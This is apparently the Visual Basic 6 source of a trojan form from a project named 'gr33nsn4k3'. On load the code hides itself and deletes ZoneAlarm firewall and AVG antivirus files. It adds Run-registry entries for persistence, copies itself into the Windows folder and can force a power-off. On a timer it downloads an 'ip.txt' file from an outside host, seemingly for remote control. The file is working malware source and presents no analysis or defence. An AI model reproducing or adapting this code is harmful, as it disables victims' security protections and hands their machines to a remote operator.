VERSION 5.00
Begin VB.Form frmInit 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2490
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3840
   Icon            =   "frmInit.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2490
   ScaleWidth      =   3840
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin gr33nsn4k3.Winsock down 
      Left            =   1020
      Top             =   1500
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   660
      Top             =   420
   End
End
Attribute VB_Name = "frmInit"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const MAX_PATH& = 260
Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szexeFile As String * MAX_PATH
End Type
Dim uProcess As PROCESSENTRY32
Dim rProcessFound As Long
Dim hSnapshot As Long
Dim szExename As String
Dim nome As String
Dim desliga As Boolean
Dim eu As String
Dim exitCode As Long
Dim myProcess As Long
Dim AppKill As Boolean
Dim appCount As Integer
Dim i As Integer
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" _
    Alias "ShellExecuteA" (ByVal hwnd As Long, _
    ByVal lpOperation As String, _
    ByVal lpFile As String, _
    ByVal lpParameters As String, _
    ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As Long

Private m_sDATA                         As String
Private Percent                         As Integer
Private BeginTransfer                   As Single

Private Header                          As Variant
Private Status                          As String
Private TransferRate                    As Single

Private bDownloadPaused                 As Boolean
Private bDownloadComplete               As Boolean

Private strSvrURL                       As String
Private strSvrPort                      As String
Private URL                             As String
Private strSalvarEm                     As String
Private Filename                        As String
Private FileLength                      As Single
Private Sec                             As Integer
Private Min                             As Integer
Private Hr                              As Integer

Private BytesAlreadySent                As Single
Private bytesRemaining                  As Single

Dim X(100), Y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Const WM_CLOSE = &H10

Private Type SECURITY_ATTRIBUTES

nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long

Private Type LUID
         UsedPart As Long
         IgnoredForNowHigh32BitPart As Long
      End Type

      Private Type TOKEN_PRIVILEGES
        PrivilegeCount As Long
        TheLuid As LUID
        Attributes As Long
      End Type

      Private Const EWX_SHUTDOWN As Long = 1
      Private Const EWX_FORCE As Long = 4
      Private Const EWX_REBOOT = 2
      Private Const EWX_POWEROFF As Long = 8

      Private Declare Function ExitWindowsEx Lib "user32" (ByVal _
           dwOptions As Long, ByVal dwReserved As Long) As Long

      Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
      Private Declare Function OpenProcessToken Lib "advapi32" (ByVal _
         ProcessHandle As Long, _
         ByVal DesiredAccess As Long, TokenHandle As Long) As Long
      Private Declare Function LookupPrivilegeValue Lib "advapi32" _
         Alias "LookupPrivilegeValueA" _
         (ByVal lpSystemName As String, ByVal lpName As String, lpLuid _
         As LUID) As Long
      Private Declare Function AdjustTokenPrivileges Lib "advapi32" _
         (ByVal TokenHandle As Long, _
         ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES _
         , ByVal BufferLength As Long, _
      PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Sub AdjustToken()
         Const TOKEN_ADJUST_PRIVILEGES = &H20
         Const TOKEN_QUERY = &H8
         Const SE_PRIVILEGE_ENABLED = &H2
         Dim hdlProcessHandle As Long
         Dim hdlTokenHandle As Long
         Dim tmpLuid As LUID
         Dim tkp As TOKEN_PRIVILEGES
         Dim tkpNewButIgnored As TOKEN_PRIVILEGES
         Dim lBufferNeeded As Long

         hdlProcessHandle = GetCurrentProcess()
         OpenProcessToken hdlProcessHandle, (TOKEN_ADJUST_PRIVILEGES Or _
            TOKEN_QUERY), hdlTokenHandle
         LookupPrivilegeValue "", "SeShutdownPrivilege", tmpLuid

         tkp.PrivilegeCount = 1
         tkp.TheLuid = tmpLuid
         tkp.Attributes = SE_PRIVILEGE_ENABLED
         AdjustTokenPrivileges hdlTokenHandle, False, _
         tkp, Len(tkpNewButIgnored), tkpNewButIgnored, lBufferNeeded
     End Sub

Public Function GetCaption(lhWnd As Long) As String

Dim sA As String, lLen As Long

   lLen& = GetWindowTextLength(lhWnd&)

      sA$ = String(lLen&, 0&)

   Call GetWindowText(lhWnd&, sA$, lLen& + 1)
   GetCaption$ = sA$

End Function
Public Function DLHFindWin(frm As Form, WinTitle As String, _
CaseSensitive As Boolean) As Long

Dim lhWnd As Long, sA As String

   lhWnd& = frm.hwnd


Do

   DoEvents
      If lhWnd& = 0 Then Exit Do
         If CaseSensitive = False Then
             sA$ = LCase$(GetCaption(lhWnd&))
             WinTitle$ = LCase$(WinTitle$)
         Else
             sA$ = GetCaption(lhWnd&)
         End If

       If InStr(sA$, WinTitle$) Then
          DLHFindWin& = lhWnd&
          Exit Do
       Else
         DLHFindWin& = 0
       End If

       lhWnd& = GetNextWindow(lhWnd&, 2)

Loop

End Function


Public Sub CreateNewDirectory(NewDirectory As String)
    Dim sDirTest As String
    Dim SecAttrib As SECURITY_ATTRIBUTES
    Dim bSuccess As Boolean
    Dim sPath As String
    Dim iCounter As Integer
    Dim sTempDir As String
    iFlag = 0
    sPath = NewDirectory
    
    If Right(sPath, Len(sPath)) <> "\" Then
        sPath = sPath & "\"
    End If
    
    iCounter = 1
    
    Do Until InStr(iCounter, sPath, "\") = 0
        iCounter = InStr(iCounter, sPath, "\")
        sTempDir = Left(sPath, iCounter)
        sDirTest = dir(sTempDir)
        iCounter = iCounter + 1
        SecAttrib.lpSecurityDescriptor = &O0
        SecAttrib.bInheritHandle = False
        SecAttrib.nLength = Len(SecAttrib)
        bSuccess = CreateDirectory(sTempDir, SecAttrib)
    Loop

End Sub
Private Function KillApp(myName As String) As Boolean

Const PROCESS_ALL_ACCESS = 0

On Local Error GoTo Finish
appCount = 0

Const TH32CS_SNAPPROCESS As Long = 2&

uProcess.dwSize = Len(uProcess)
hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
rProcessFound = ProcessFirst(hSnapshot, uProcess)
List1.Clear

Do While rProcessFound
i = InStr(1, uProcess.szexeFile, Chr(0))
szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
List1.AddItem (szExename)
If Right$(szExename, Len(myName)) = LCase$(myName) Then
KillApp = True
appCount = appCount + 1
myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
AppKill = TerminateProcess(myProcess, exitCode)
Call CloseHandle(myProcess)
End If


rProcessFound = ProcessNext(hSnapshot, uProcess)
Loop

Call CloseHandle(hSnapshot)
Finish:
End Function
 
 
Public Function InStrRevVB5(ByVal StringCheck As String, ByVal StringMatch As String, Optional ByVal Start As Long = -1) As Long
    Dim lPos        As Long
    Dim lSavePos    As Long
    If Start = -1 Then Start = Len(StringCheck)
    lPos = InStr(1, StringCheck, StringMatch, vbBinaryCompare)
    While lPos > 0 And lPos < Start
        lSavePos = lPos
        lPos = InStr(lPos + 1, StringCheck, StringMatch, vbBinaryCompare)
    Wend
    InStrRevVB5 = lSavePos
End Function

Private Function GETDATAHEAD(data As Variant, ToRetrieve As String)
    Dim EndBYTES                        As Integer
    Dim A                               As String
    Dim LENGTHEND                       As Integer
    Dim PART                            As Integer
    Dim Part2                           As Integer
    Dim RetrieveLength                  As Integer
    On Error Resume Next
    If data = "" Then Exit Function
    If InStr(data, ToRetrieve) > 0 Then
        LENGTHEND = Len(data)
        PART = InStr(data, ToRetrieve)
        RetrieveLength = Len(ToRetrieve)
        A = Right(data, LENGTHEND - PART - RetrieveLength)
        LENGTHEND = Len(A)
        If InStr(A, vbCrLf) > 0 Then
            Part2 = InStr(A, vbCrLf)
            A = Left(A, Part2 - 1)
        End If
        GETDATAHEAD = A
    End If
End Function

Public Function StartUpdate(ByVal strURL As String)
    Dim Pos                             As Integer
    Dim Length                          As Integer
    Dim NextPos                         As Integer
    Dim LENGTH2                         As Integer
    Dim POS2                            As Integer
    Dim POS3                            As Integer
    BytesAlreadySent = 1
    If strURL = "" Then
        Exit Function
    End If
    URL = strURL
    Pos = InStr(strURL, "://") 'Record position of ://
    LENGTH2 = Len("://") 'Record the length of it
    Length = Len(strURL) 'Length of the entire url
    If InStr(strURL, "://") Then  ' check if they entered the http:// or ftp://
        strURL = Right(strURL, Length - LENGTH2 - Pos + 1) ' remove http:// or ftp://
    End If
    If InStr(strURL, "/") Then 'looks for the first / mark going from left to right
        POS2 = InStr(strURL, "/") 'gets the position of the / mark
        '-----------------GET THE FILENAME-------------
        Dim strFile                     As String
        strFile = strURL 'load the variables into each other
        Do Until InStr(strFile, "/") = 0 'Do the loop until all is left is the filename
            LENGTH2 = Len(strFile) 'get the length of the filename every time its passed over by the loop
            POS3 = InStr(strFile, "/") 'find the / mark
            strFile = Right(strURL, LENGTH2 - POS3) 'slash it down removing everything before the / mark including the / mark...
        Loop
        
            If InStr(strFile, ":") Then
                Filename = Left(strFile, InStr(strFile, ":") - 1)
            Else
                Filename = strFile
            End If
            
        strSvrURL = Left(strURL, POS2 - 1) 'removes everything after the / mark leaving just the server name as the end result
    End If
    '-----------END TRIM THE URL FOR THE SERVER NAME-----------
End Function

Private Sub CloseSocket()
    Do Until down.State = 0
        down.CloseSck
        down.LocalPort = 0
        Close #1
    Loop
End Sub

Private Sub baixar()
    strSvrURL = "http://www.megaaccesshp.hpg.ig.com.br/ip.txt"
    strSvrPort = 80
    
    StartUpdate strSvrURL
    
    strSalvarEm = "C:\ip.txt"
    
    down.Connect strSvrURL, strSvrPort
End Sub

Private Sub down_Closesck()
frmInvasor.Show


    down.CloseSck
    
    Unload Me
End Sub

Private Sub Form_Load()
 On Error Resume Next
If App.PrevInstance = True Then Unload Me


    CloseSocket
SetStringValue "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Zone Labs Client", ""
Kill "C:\Arquivos de programas\Zone Labs\ZoneAlarm\zlclient.exe"
Kill "C:\Arquivos de programas\Zone Labs\ZoneAlarm\idlock.zap"
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\filter.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\firewall.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\email.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\alert.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\expert.dll")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\framewrk.dll")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\zonealarm.exe")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\security.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\privacy.zap")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\repair\vsmon.exe")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\repair\vsinit.dll")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\repair\vsutil.dll")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\repair\vsruledb.dll")
Kill ("C:\Arquivos de programas\Zone Labs\ZoneAlarm\repair\vsdb.dll.dll")
Kill "C:\Windows\AVG7 Update.exe"
Kill "C:\Windows\AVG.exe"
Kill "C:\Windows\System32\AVG.exe"
Kill "C:\Windows\System32\AVG7 Update.exe"
Kill "C:\Windows\msnUpdate.exe"
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVG7 Update", "DESINSTALADO"
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "msn Update", " "
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "winupdt", " "
SetStringValue "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "winup", "C:\Windows\winupdt.exe"
FileCopy eu, "C:\Windows\winupd.exe"
If FileExist("C:\Windows\AVG7 Update.exe") = True Or FileExist("C:\Windows\winupdt.exe") = True Then
AdjustToken
       ExitWindowsEx (EWX_POWEROFF), &HFFFF
End If
 App.TaskVisible = False

If Len(App.path) = 3 Then
eu = App.path & App.EXEName & ".exe"
Else
eu = App.path & "\" & App.EXEName & ".exe"
End If
'FileCopy eu, "C:\Windows\msnUpdate.exe"
Kill "C:\Windows\winupdt.exe"

Timer1.Enabled = True
End Sub


Private Sub down_Connect()
    On Error Resume Next
    
    Dim strCommand As String
    
    strCommand = "GET " + Right(URL, Len(URL) - Len(strSvrURL) - 7) + " HTTP/1.0" + vbCrLf
    strCommand = strCommand + "Accept: *.*, */*" + vbCrLf
    
    strCommand = strCommand + "User-Agent: Downloader By Frederico Machado" & vbCrLf
    strCommand = strCommand + "Referer: " & strSvrURL & vbCrLf
    strCommand = strCommand + "Host: " & strSvrURL & vbCrLf
    
    strCommand = strCommand + vbCrLf
    down.SendData strCommand 'sends a header to the server instructing it what to do!
  '  BeginTransfer = Timer 'start timer for transfer rate
End Sub

Private Sub down_DataArrival(ByVal bytesTotal As Long)
    Dim Pos                             As Integer
    Dim Length                          As Integer
    Dim HEAD                            As String
    Debug.Print bytesTotal
    down.GetData m_sDATA, vbString
    down.CloseSck
    If InStr(LCase(m_sDATA), "content-type:") Then 'find out if this chunk has the header..you can change that to anything that the header contains
  
   
        Pos = InStr(m_sDATA, vbCrLf & vbCrLf) ' find out where the header and the data is split apart
        Length = Len(m_sDATA) 'get the length of the data chunk
        HEAD = Left(m_sDATA, Pos - 1) 'Get the header from the chunk of data and ignore the data content
        m_sDATA = Right(m_sDATA, Length - Pos - 3) 'Get the data from the first chunk that contains the header also
        Header = Header & HEAD 'Append the header to header text box
        
        bytesRemaining = GETDATAHEAD(Header, "Content-Length:")
        
        'frmHeader.txtHeader = Header
    End If
    '-----------BEGIN WRITE CHUNK TO FILE CODE--------
    Open strSalvarEm For Binary Access Write As #1 'opens file for output
    Put #1, BytesAlreadySent, m_sDATA 'writes data to the end of file
    BytesAlreadySent = Seek(1)
    Close #1 'close file for now until next data chunk is available
    '--------------------------------------------------
    
    'If you dont subtract the difference you will get a really large and odd download speed hehe.
   ' TransferRate = Format(Int((BytesAlreadySent - FileLength) / (Timer - BeginTransfer)) / 1000, "####.00")
End Sub
Private Sub Timer1_Timer()
If IsConnected = True Then
baixar
End If
End Sub
